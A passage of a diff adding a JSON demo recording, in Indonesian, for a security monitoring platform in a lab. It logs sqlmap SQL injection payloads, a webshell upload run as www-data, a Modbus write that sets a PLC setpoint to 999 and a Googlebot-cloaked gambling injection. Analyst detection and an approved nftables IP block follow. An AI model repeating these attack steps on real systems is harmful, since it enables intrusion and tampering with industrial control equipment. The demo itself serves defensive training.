+     "teks": "[02:45:31] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string=\"Satuan\")"
+    },
+    {
+     "t": 1794105931367,
+     "teks": "[02:45:31] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'"
+    },
+    {
+     "t": 1794105931367,
+     "teks": "[02:45:31] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found"
+    },
+    {
+     "t": 1794105931376,
+     "teks": "[02:45:31] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test"
+    },
+    {
+     "t": 1794105931383,
+     "teks": "[02:45:31] [INFO] target URL appears to have 3 columns in query"
+    },
+    {
+     "t": 1794105931397,
+     "teks": "[02:45:31] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable"
+    },
+    {
+     "t": 1794105931411,
+     "teks": "GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N"
+    },
+    {
+     "t": 1794105931421,
+     "teks": "sqlmap identified the following injection point(s) with a total of 15 HTTP(s) requests:"
+    },
+    {
+     "t": 1794105931421,
+     "teks": "---"
+    },
+    {
+     "t": 1794105931421,
+     "teks": "Parameter: id (GET)"
+    },
+    {
+     "t": 1794105931421,
+     "teks": "    Type: boolean-based blind"
+    },
+    {
+     "t": 1794105931421,
+     "teks": "    Title: AND boolean-based blind - WHERE or HAVING clause"
+    },
+    {
+     "t": 1794105931421,
+     "teks": "    Payload: id=1 AND 3765=3765"
+    },
+    {
+     "t": 1794105931421,
+     "teks": ""
+    },
+    {
+     "t": 1794105931421,
+     "teks": "    Type: UNION query"
+    },
+    {
+     "t": 1794105931421,
+     "teks": "    Title: Generic UNION query (NULL) - 3 columns"
+    },
+    {
+     "t": 1794105931421,
+     "teks": "    Payload: id=1 UNION ALL SELECT NULL,NULL,CHAR(113,106,120,113,113)||CHAR(105,84,114,116,82,117,100,98,89,88,105,119,101,115,79,71,80,97,80,112,71,73,81,100,100,114,65,68,114,75,90,109,116,100,67,101,68,104,122,114)||CHAR(113,120,118,98,113)-- aDSY"
+    },
+    {
+     "t": 1794105931421,
+     "teks": "---"
+    },
+    {
+     "t": 1794105931429,
+     "teks": "do you want to exploit this SQL injection? [Y/n] Y"
+    },
+    {
+     "t": 1794105931429,
+     "teks": "[02:45:31] [INFO] testing SQLite"
+    },
+    {
+     "t": 1794105931446,
+     "teks": "[02:45:31] [INFO] confirming SQLite"
+    },
+    {
+     "t": 1794105931446,
+     "teks": "[02:45:31] [INFO] actively fingerprinting SQLite"
+    },
+    {
+     "t": 1794105931446,
+     "teks": "[02:45:31] [INFO] the back-end DBMS is SQLite"
+    },
+    {
+     "t": 1794105931446,
+     "teks": "web application technology: Nginx"
+    },
+    {
+     "t": 1794105931446,
+     "teks": "back-end DBMS: SQLite"
+    },
+    {
+     "t": 1794105931446,
+     "teks": "[02:45:31] [INFO] fetching tables for database: 'SQLite_masterdb'"
+    },
+    {
+     "t": 1794105931452,
+     "teks": "<current>"
+    },
+    {
+     "t": 1794105931452,
+     "teks": "[2 tables]"
+    },
+    {
+     "t": 1794105931452,
+     "teks": "+----------+"
+    },
+    {
+     "t": 1794105931452,
+     "teks": "| berita   |"
+    },
+    {
+     "t": 1794105931452,
+     "teks": "| pengguna |"
+    },
+    {
+     "t": 1794105931452,
+     "teks": "+----------+"
+    },
+    {
+     "t": 1794105931452,
+     "teks": ""
+    },
+    {
+     "t": 1794105931453,
+     "teks": "[02:45:31] [WARNING] HTTP error codes detected during run:"
+    },
+    {
+     "t": 1794105931453,
+     "teks": "500 (Internal Server Error) - 8 times"
+    },
+    {
+     "t": 1794105931453,
+     "teks": "[02:45:31] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-11082026_0245am.csv'"
+    },
+    {
+     "t": 1794105931453,
+     "teks": "[02:45:31] [WARNING] your sqlmap version is outdated"
+    },
+    {
+     "t": 1794105931453,
+     "teks": ""
+    },
+    {
+     "t": 1794105931453,
+     "teks": "[*] ending @ 02:45:31 /2026-11-08/"
+    },
+    {
+     "t": 1794105931453,
+     "teks": ""
+    }
+   ]
+  },
+  {
+   "id": "webshell-kodim-a",
+   "judul": "Persistensi: unggah webshell",
+   "container": "attacker",
+   "perintah": "./skenario/05-webshell.sh 172.30.0.11",
+   "mulai": 1794105935899,
+   "selesai": 1794105939212,
+   "kode": 0,
+   "baris": [
+    {
+     "t": 1794105936159,
+     "teks": "Mengunggah webshell ke http://172.30.0.11/upload.php ..."
+    },
+    {
+     "t": 1794105936168,
+     "teks": "Laporan diterima: /uploads/laporan-warga.php"
+    },
+    {
+     "t": 1794105939177,
+     "teks": "Menjalankan perintah 'id' lewat webshell:"
+    },
+    {
+     "t": 1794105939199,
+     "teks": "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
+    }
+   ]
+  },
+  {
+   "id": "modbus-plc",
+   "judul": "Dampak OT: tulis Modbus ke PLC",
+   "container": "attacker",
+   "perintah": "python3 skenario/04-modbus-tulis.py 172.30.0.20",
+   "mulai": 1794105943563,
+   "selesai": 1794105944021,
+   "kode": 0,
+   "baris": [
+    {
+     "t": 1794105943987,
+     "teks": "baca setpoint: [80, 0]"
+    },
+    {
+     "t": 1794105943989,
+     "teks": "setelah tulis: [999, 0]"
+    }
+   ]
+  },
+  {
+   "id": "judol-kodim-a",
+   "judul": "Dampak: injeksi judi online ber-cloaking",
+   "container": "attacker",
+   "perintah": "./skenario/06-judol-cloaking.sh 172.30.0.11",
+   "mulai": 1794105948433,
+   "selesai": 1794105951936,
+   "kode": 0,
+   "baris": [
+    {
+     "t": 1794105948872,
+     "teks": "Mengunggah dropper ke http://172.30.0.11/upload.php ..."
+    },
+    {
+     "t": 1794105948882,
+     "teks": "Laporan diterima: /uploads/sitemap-cache.php"
+    },
+    {
+     "t": 1794105948893,
+     "teks": "kode cloaking disisipkan"
+    },
+    {
+     "t": 1794105951913,
+     "teks": "Yang dilihat pengunjung biasa : Portal Berita Kodim Latihan A"
+    },
+    {
+     "t": 1794105951924,
+     "teks": "Yang dilihat Googlebot        : SLOT GACOR MAXWIN HARI INI"
+    }
+   ]
+  },
+  {
+   "id": "penjaga-situs",
+   "judul": "Core: Penjaga Situs memeriksa portal",
+   "container": "sentra-core",
+   "perintah": "php artisan sentra:penjaga-situs",
+   "mulai": 1794105970749,
+   "selesai": 1794105971331,
+   "kode": 0,
+   "baris": [
+    {
+     "t": 1794105971294,
+     "teks": "  http://kodim-a/ ........................ DITANDAI: Googlebot, Referer Google  "
+    },
+    {
+     "t": 1794105971300,
+     "teks": "  http://kodim-b/ ....................................................... aman  "
+    }
+   ]
+  },
+  {
+   "id": "akses-portal",
+   "judul": "Penyerang mencoba membuka portal Kodim A",
+   "container": "attacker",
+   "perintah": "n=0; gagal=0\nwhile [ $n -lt 600 ]; do\n  n=$((n+1)); w=$(TZ=WIB-7 date +%H:%M:%S.%3N)\n  k=$(curl -s -m 1 -o /dev/null -w '%{http_code}' http://172.30.0.11/)\n  if [ \"$k\" = \"200\" ]; then echo \"$w GET http://172.30.0.11/ -> HTTP $k (tersambung)\";\n  else gagal=$((gagal+1))\n    if [ $gagal -eq 1 ]; then echo \"$w GET http://172.30.0.11/ -> kode $k\"; echo \"Koneksi penyerang ke Kodim A TERPUTUS (kode $k). Blokir nftables bekerja.\";\n    else echo \"$w GET http://172.30.0.11/ -> kode $k (masih terputus)\"; fi\n    [ $gagal -ge 4 ] && break\n  fi\n  sleep 0.5\ndone",
+   "mulai": 1794105987199,
+   "selesai": 1794106020370,
+   "kode": 0,
+   "baris": [
+    {
+     "t": 1794105987435,
+     "teks": "09:46:27.420 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794105987950,
+     "teks": "09:46:27.938 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794105988457,
+     "teks": "09:46:28.450 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794105988973,
+     "teks": "09:46:28.962 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794105989482,
+     "teks": "09:46:29.476 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794105989992,
+     "teks": "09:46:29.985 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794105990504,
+     "teks": "09:46:30.494 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794105991014,
+     "teks": "09:46:31.006 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794105991524,
+     "teks": "09:46:31.516 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794105992033,
+     "teks": "09:46:32.027 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794105992546,
+     "teks": "09:46:32.535 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794105993063,
+     "teks": "09:46:33.049 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794105993572,
+     "teks": "09:46:33.566 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794105994084,
+     "teks": "09:46:34.076 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794105994619,
+     "teks": "09:46:34.590 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794105995129,
+     "teks": "09:46:35.117 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794105995640,
+     "teks": "09:46:35.631 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794105996152,
+     "teks": "09:46:36.142 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794105996661,
+     "teks": "09:46:36.655 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794105997192,
+     "teks": "09:46:37.176 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794105997708,
+     "teks": "09:46:37.700 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794105998222,
+     "teks": "09:46:38.210 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794105998741,
+     "teks": "09:46:38.730 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794105999291,
+     "teks": "09:46:39.278 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794105999820,
+     "teks": "09:46:39.810 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106000337,
+     "teks": "09:46:40.324 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106000858,
+     "teks": "09:46:40.845 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106001379,
+     "teks": "09:46:41.362 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106001894,
+     "teks": "09:46:41.885 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106002405,
+     "teks": "09:46:42.397 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106002918,
+     "teks": "09:46:42.908 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106003428,
+     "teks": "09:46:43.420 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106003943,
+     "teks": "09:46:43.930 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106004452,
+     "teks": "09:46:44.445 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106004971,
+     "teks": "09:46:44.958 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106005535,
+     "teks": "09:46:45.490 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106006071,
+     "teks": "09:46:46.040 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106006578,
+     "teks": "09:46:46.570 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106007094,
+     "teks": "09:46:47.081 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106007607,
+     "teks": "09:46:47.595 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106008118,
+     "teks": "09:46:48.109 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106008631,
+     "teks": "09:46:48.622 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106009141,
+     "teks": "09:46:49.131 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106009661,
+     "teks": "09:46:49.642 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106010175,
+     "teks": "09:46:50.166 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106010697,
+     "teks": "09:46:50.682 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106011221,
+     "teks": "09:46:51.202 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106011736,
+     "teks": "09:46:51.724 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106012248,
+     "teks": "09:46:52.238 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106012763,
+     "teks": "09:46:52.749 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106013269,
+     "teks": "09:46:53.263 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106013789,
+     "teks": "09:46:53.772 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106014310,
+     "teks": "09:46:54.293 GET http://172.30.0.11/ -> HTTP 200 (tersambung)"
+    },
+    {
+     "t": 1794106015818,
+     "teks": "09:46:54.810 GET http://172.30.0.11/ -> kode 000"
+    },
+    {
+     "t": 1794106015818,
+     "teks": "Koneksi penyerang ke Kodim A TERPUTUS (kode 000). Blokir nftables bekerja."
+    },
+    {
+     "t": 1794106017334,
+     "teks": "09:46:56.324 GET http://172.30.0.11/ -> kode 000 (masih terputus)"
+    },
+    {
+     "t": 1794106018847,
+     "teks": "09:46:57.838 GET http://172.30.0.11/ -> kode 000 (masih terputus)"
+    },
+    {
+     "t": 1794106020361,
+     "teks": "09:46:59.349 GET http://172.30.0.11/ -> kode 000 (masih terputus)"
+    }
+   ]
+  },
+  {
+   "id": "sensor-mati",
+   "judul": "Simulasi: sensor Kodim B dimatikan",
+   "container": "kodim-b",
+   "perintah": "supervisorctl stop sentra-agent",
+   "mulai": 1794106071965,
+   "selesai": 1794106072468,
+   "kode": 0,
+   "baris": [
+    {
+     "t": 1794106072425,
+     "teks": "sentra-agent: stopped"
+    }
+   ]
+  },
+  {
+   "id": "sensor-hidup",
+   "judul": "Agent Kodim B dihidupkan kembali",
+   "container": "kodim-b",
+   "perintah": "supervisorctl start sentra-agent",
+   "mulai": 1794106113665,
+   "selesai": 1794106115208,
+   "kode": 0,
+   "baris": [
+    {
+     "t": 1794106115161,
+     "teks": "sentra-agent: started"
+    }
+   ]
+  }
+ ],
+ "penanda": [
+  {
+   "t": 1794105715442,
+   "video": "analis",
+   "id": "login",
+   "ket": "Halaman masuk, akun analis@sentra.lab"
+  },
+  {
+   "t": 1794105721491,
+   "video": "analis",
+   "id": "beranda-awal",
+   "ket": "Beranda Komando sebelum serangan",
+   "kotak": {
+    "situasi": {
+     "x": 326,
+     "y": 220,
+     "w": 628,
+     "h": 346
+    },
+    "peta": {
+     "x": 971,
+     "y": 220,
+     "w": 887,
+     "h": 881
+    }
+   },
+   "siaga": "\n                        \nSiaga: Aman\n                    "
+  },
+  {
+   "t": 1794105723463,
+   "video": "komandan",
+   "id": "login",
+   "ket": "Halaman masuk, akun komandan@sentra.lab"
+  },
+  {
+   "t": 1794105727268,
+   "video": "komandan",
+   "id": "beranda-awal",
+   "ket": "Beranda Komando di HP"
+  },
+  {
+   "t": 1794105733693,
+   "video": "serangan",
+   "id": "nmap-a",
+   "ket": "nmap ke Kodim A"
+  },
+  {
+   "t": 1794105797563,
+   "video": "serangan",
+   "id": "hydra-a",
+   "ket": "hydra brute force SSH ke Kodim A"
+  },
+  {
+   "t": 1794105810986,
+   "video": "analis",
+   "id": "arus-event",
+   "ket": "Arus event live saat brute force",
+   "kotak": {
+    "x": 971,
+    "y": 259,
+    "w": 887,
+    "h": 800
+   },
+   "scrollY": 1027.84375
+  },
+  {
+   "t": 1794105828088,
+   "video": "analis",
+   "id": "beranda-saat-hydra",
+   "ket": "Beranda saat brute force berjalan"
+  },
+  {
+   "t": 1794105891973,
+   "video": "serangan",
+   "id": "nmap-b",
+   "ket": "nmap ke Kodim B"
+  },
+  {
+   "t": 1794105896846,
+   "video": "analis",
+   "id": "beranda-kampanye",
+   "ket": "Peta operasi: dua satuan sasaran dari IP yang sama",
+   "kotak": {
+    "peta": {
+     "x": 971,
+     "y": 220,
+     "w": 887,
+     "h": 881
+    }
+   }
+  },
+  {
+   "t": 1794105900982,
+   "video": "analis",
+   "id": "menu-kampanye",
+   "ket": "Menu Kampanye",
+   "klik": {
+    "x": 0,
+    "y": 214,
+    "w": 263,
+    "h": 43
+   }
+  },
+  {
+   "t": 1794105905660,
+   "video": "analis",
+   "id": "buka-kampanye",
+   "ket": "Buka kampanye",
+   "klik": {
+    "x": 340,
+    "y": 348,
+    "w": 149,
+    "h": 21
+   }
+  },
+  {
+   "t": 1794105909134,
+   "video": "analis",
+   "id": "kampanye",
+   "ket": "Kampanye lintas satuan",
+   "kotak": {
+    "urutan": {
+     "x": 326,
+     "y": 254,
+     "w": 1532,
+     "h": 290
+    }
+   }
+  },
+  {
+   "t": 1794105916121,
+   "video": "analis",
+   "id": "menu-insiden",
+   "ket": "Menu Insiden",
+   "klik": {
+    "x": 0,
+    "y": 171,
+    "w": 263,
+    "h": 43
+   }
+  },
+  {
+   "t": 1794105920330,
+   "video": "analis",
+   "id": "buka-insiden",
+   "ket": "Buka insiden Kodim A",
+   "klik": {
+    "x": 344,
+    "y": 538,
+    "w": 291,
+    "h": 24
+   }
+  },
+  {
+   "t": 1794105923598,
+   "video": "analis",
+   "id": "detail-insiden-awal",
+   "ket": "Detail Insiden: tahap Pengintaian dan Akses Awal",
+   "kotak": {
+    "story": {
+     "x": 326,
+     "y": 346,
+     "w": 1532,
+     "h": 514
+    },
+    "skor": {
+     "x": 1390,
+     "y": 147,
+     "w": 103,
+     "h": 60
+    }
+   }
+  },
+  {
+   "t": 1794105927061,
+   "video": "serangan",
+   "id": "sqlmap-a",
+   "ket": "sqlmap ke portal Kodim A"
+  },
+  {
+   "t": 1794105935898,
+   "video": "serangan",
+   "id": "webshell-a",
+   "ket": "Unggah webshell ke portal Kodim A"
+  },
+  {
+   "t": 1794105943562,
+   "video": "serangan",
+   "id": "modbus",
+   "ket": "Perintah tulis Modbus ke PLC"
+  },
+  {
+   "t": 1794105948429,
+   "video": "serangan",
+   "id": "judol",
+   "ket": "Injeksi judi online ber-cloaking ke portal Kodim A"
+  },
+  {
+   "t": 1794105954979,
+   "video": "analis",
+   "id": "detail-insiden-lengkap",
+   "ket": "Attack Story lengkap, skor Kritis",
+   "kotak": {
+    "story": {
+     "x": 326,
+     "y": 346,
+     "w": 1532,
+     "h": 955
+    },
+    "skor": {
+     "x": 1371,
+     "y": 147,
+     "w": 122,
+     "h": 60
+    }
+   },
+   "skor": "858"
+  },
+  {
+   "t": 1794105959782,
+   "video": "analis",
+   "id": "rincian-skor",
+   "ket": "Rincian skor dengan rumus terbuka",
+   "kotak": {
+    "x": 1358,
+    "y": 176,
+    "w": 499,
+    "h": 882
+   },
+   "scrollY": 1560.125
+  },
+  {
+   "t": 1794105965597,
+   "video": "analis",
+   "id": "event-bukti",
+   "ket": "Event bukti mentah",
+   "kotak": {
+    "x": 326,
+    "y": 90,
+    "w": 1016,
+    "h": 986
+   },
+   "scrollY": 1228
+  },
+  {
+   "t": 1794105970746,
+   "video": "core",
+   "id": "penjaga-situs",
+   "ket": "Core: Penjaga Situs memeriksa portal"
+  },
+  {
+   "t": 1794105971964,
+   "video": "analis",
+   "id": "menu-penjaga-situs",
+   "ket": "Menu Penjaga Situs",
+   "klik": {
+    "x": 0,
+    "y": 384,
+    "w": 263,
+    "h": 43
+   }
+  },
+  {
+   "t": 1794105975619,
+   "video": "analis",
+   "id": "penjaga-situs",
+   "ket": "Penjaga Situs: versi Googlebot berisi judi",
+   "kotak": {
+    "status": {
+     "x": 1558,
+     "y": 262,
+     "w": 199,
+     "h": 58
+    },
+    "googlebot": {
+     "x": 1106,
+     "y": 549,
+     "w": 318,
+     "h": 318
+    }
+   }
+  },
+  {
+   "t": 1794105980356,
+   "video": "analis",
+   "id": "penjaga-situs-varian",
+   "ket": "Perbandingan varian browser vs Googlebot",
+   "kotak": {
+    "x": 1106,
+    "y": 388,
+    "w": 318,
+    "h": 318
+   },
+   "scrollY": 388.625
+  },
+  {
+   "t": 1794105987209,
+   "video": "serangan",
+   "id": "akses-portal",
+   "ket": "Penyerang terus membuka portal Kodim A"
+  },
+  {
+   "t": 1794105993006,
+   "video": "analis",
+   "id": "panel-tindakan",
+   "ket": "Panel Tindakan respons",
+   "kotak": {
+    "x": 1358,
+    "y": 90,
+    "w": 499,
+    "h": 315
+   },
+   "scrollY": 1228
+  },
+  {
+   "t": 1794105995154,
+   "video": "analis",
+   "id": "pilih-durasi",
+   "ket": "Pilih durasi blokir",
+   "klik": {
+    "x": 1381,
+    "y": 272,
+    "w": 455,
+    "h": 47
+   }
+  },
+  {
+   "t": 1794105997854,
+   "video": "analis",
+   "id": "usulkan",
+   "ket": "Analis mengusulkan blokir IP",
+   "klik": {
+    "x": 1381,
+    "y": 332,
+    "w": 455,
+    "h": 51
+   }
+  },
+  {
+   "t": 1794105998889,
+   "video": "analis",
+   "id": "usulan-terkirim",
+   "ket": "Usulan blokir terkirim ke Antrean Persetujuan",
+   "kotak": {
+    "tindakan": {
+     "x": 1358,
+     "y": 90,
+     "w": 499,
+     "h": 695
+    }
+   }
+  },
+  {
+   "t": 1794106001361,
+   "video": "komandan",
+   "id": "hp-antrean-laci",
+   "ket": "Buka menu operasi",
+   "klik": {
+    "x": 9,
+    "y": 66,
+    "w": 47,
+    "h": 47
+   }
+  },
+  {
+   "t": 1794106004013,
+   "video": "komandan",
+   "id": "hp-antrean",
+   "ket": "Menu Antrean Persetujuan",
+   "klik": {
+    "x": 0,
+    "y": 239,
+    "w": 334,
+    "h": 43
+   }
+  },
+  {
+   "t": 1794106007524,
+   "video": "komandan",
+   "id": "antrean",
+   "ket": "Antrean Persetujuan di HP Komandan",
+   "kotak": {
+    "usulan": {
+     "x": 17,
+     "y": 351,
+     "w": 356,
+     "h": 599
+    }
+   }
+  },
+  {
+   "t": 1794106011534,
+   "video": "komandan",
+   "id": "setujui",
+   "ket": "Komandan menyetujui dari HP",
+   "klik": {
+    "x": 35,
+    "y": 746,
+    "w": 154,
+    "h": 60
+   }
+  },
+  {
+   "t": 1794106012476,
+   "video": "komandan",
+   "id": "disetujui",
+   "ket": "Perintah dikirim ke agent"
+  },
+  {
+   "t": 1794106020394,
+   "video": "analis",
+   "id": "dieksekusi",
+   "ket": "Status tindakan Dieksekusi tanpa muat ulang",
+   "kotak": {
+    "tindakan": {
+     "x": 1358,
+     "y": 90,
+     "w": 499,
+     "h": 648
+    }
+   }
+  },
+  {
+   "t": 1794106024364,
+   "video": "komandan",
+   "id": "hp-beranda-laci",
+   "ket": "Buka menu operasi",
+   "klik": {
+    "x": 9,
+    "y": 66,
+    "w": 47,
+    "h": 47
+   }
+  },
+  {
+   "t": 1794106026828,
+   "video": "komandan",
+   "id": "hp-beranda",
+   "ket": "Menu Beranda",
+   "klik": {
+    "x": 0,
+    "y": 112,
+    "w": 334,
+    "h": 43
+   }
+  },
+  {
+   "t": 1794106031773,
+   "video": "analis",
+   "id": "menu-beranda-blokir",
+   "ket": "Menu Beranda",
+   "klik": {
+    "x": 0,
+    "y": 129,
+    "w": 263,
+    "h": 43
+   }
+  },
+  {
+   "t": 1794106034885,
+   "video": "analis",
+   "id": "beranda-blokir",
+   "ket": "Beranda: blokir aktif",
+   "kotak": {
+    "blokir": {
+     "x": 744,
+     "y": 657,
+     "w": 209,
+     "h": 223
+    }
+   }
+  },
+  {
+   "t": 1794106039836,
+   "video": "analis",
+   "id": "menu-tindakan",
+   "ket": "Menu Tindakan",
+   "klik": {
+    "x": 0,
+    "y": 256,
+    "w": 263,
+    "h": 43
+   }
+  },
+  {
+   "t": 1794106042936,
+   "video": "analis",
+   "id": "riwayat-tindakan",
+   "ket": "Riwayat tindakan: pengusul, pemutus, hasil agent"
+  },
+  {
+   "t": 1794106051567,
+   "video": "analis",
+   "id": "panel-lapsit",
+   "ket": "Panel LAPSIT",
+   "kotak": {
+    "x": 326,
+    "y": 715,
+    "w": 1016,
+    "h": 158
+   },
+   "scrollY": 2420.75
+  },
+  {
+   "t": 1794106052183,
+   "video": "analis",
+   "id": "buat-lapsit",
+   "ket": "Analis membuat LAPSIT",
+   "klik": {
+    "x": 1176,
+    "y": 740,
+    "w": 143,
+    "h": 43
+   }
+  },
+  {
+   "t": 1794106056657,
+   "video": "analis",
+   "id": "lapsit-terbit",
+   "ket": "LAPSIT terbit dengan sitasi bukti",
+   "kotak": {
+    "x": 326,
+    "y": 97,
+    "w": 1016,
+    "h": 962
+   },
+   "scrollY": 2474.75
+  },
+  {
+   "t": 1794106061756,
+   "video": "analis",
+   "id": "unduh-pdf",
+   "ket": "Unduh PDF LAPSIT",
+   "klik": {
+    "x": 1205,
+    "y": 211,
+    "w": 115,
+    "h": 34
+   }
+  },
+  {
+   "t": 1794106068499,
+   "video": "analis",
+   "id": "menu-beranda-sensor",
+   "ket": "Menu Beranda",
+   "klik": {
+    "x": 0,
+    "y": 129,
+    "w": 263,
+    "h": 43
+   }
+  },
+  {
+   "t": 1794106071962,
+   "video": "lab",
+   "id": "sensor-mati",
+   "ket": "Agent Kodim B dimatikan"
+  },
+  {
+   "t": 1794106101170,
+   "video": "analis",
+   "id": "agent-buta",
+   "ket": "Agent Kodim B BUTA",
+   "kotak": {
+    "agent": {
+     "x": 536,
+     "y": 657,
+     "w": 209,
+     "h": 255
+    },
+    "peta": {
+     "x": 971,
+     "y": 220,
+     "w": 887,
+     "h": 881
+    }
+   }
+  },
+  {
+   "t": 1794106107251,
+   "video": "analis",
+   "id": "menu-insiden-sensor",
+   "ket": "Menu Insiden",
+   "klik": {
+    "x": 0,
+    "y": 171,
+    "w": 263,
+    "h": 43
+   }
+  },
+  {
+   "t": 1794106110274,
+   "video": "analis",
+   "id": "insiden-sensor-buta",
+   "ket": "Insiden Sensor Buta di daftar"
+  },
+  {
+   "t": 1794106113663,
+   "video": "lab",
+   "id": "sensor-hidup",
+   "ket": "Agent Kodim B dihidupkan kembali"
+  },
+  {
+   "t": 1794106115910,
+   "video": "analis",
+   "id": "menu-beranda-hidup",
+   "ket": "Menu Beranda",
+   "klik": {
+    "x": 0,
+    "y": 129,
+    "w": 263,
+    "h": 43
+   }
+  },
+  {
+   "t": 1794106120421,
+   "video": "analis",
+   "id": "menu-uji",
+   "ket": "Menu Uji Kesiapan",
+   "klik": {
+    "x": 0,
+    "y": 342,
+    "w": 263,
+    "h": 43
+   }
+  },
+  {
+   "t": 1794106124032,
+   "video": "analis",
+   "id": "pilih-satuan",
+   "ket": "Pilih satuan Kodim Latihan A",
+   "klik": {
+    "x": 428,
+    "y": 293,
+    "w": 340,
+    "h": 43
+   }
+  },
+  {
+   "t": 1794106126368,
+   "video": "analis",
+   "id": "jalankan-uji",
+   "ket": "Jalankan Uji Kesiapan",
+   "klik": {
+    "x": 781,
+    "y": 293,
+    "w": 220,
+    "h": 43
+   }
+  },
+  {
+   "t": 1794106200954,
+   "video": "analis",
+   "id": "uji-selesai",
+   "ket": "Matriks Uji Kesiapan terisi",
+   "kotak": {
+    "cakupan": {
+     "x": 487,
+     "y": 597,
+     "w": 94,
+     "h": 44
+    }
+   }
+  },
+  {
+   "t": 1794106205760,
+   "video": "analis",
+   "id": "uji-matriks",
+   "ket": "Matriks skenario",
+   "kotak": {
+    "x": 487,
+    "y": 327,
+    "w": 94,
+    "h": 44
+   },
+   "scrollY": 456.875
+  },
+  {
+   "t": 1794106213236,
+   "video": "analis",
+   "id": "menu-audit",
+   "ket": "Menu Audit Log",
+   "klik": {
+    "x": 0,
+    "y": 427,
+    "w": 263,
+    "h": 43
+   }
+  },
+  {
+   "t": 1794106217351,
+   "video": "analis",
+   "id": "verifikasi",
+   "ket": "Verifikasi Rantai audit",
+   "klik": {
+    "x": 1566,
+    "y": 285,
+    "w": 186,
+    "h": 47
+   }
+  },
+  {
+   "t": 1794106219705,
+   "video": "analis",
+   "id": "audit-utuh",
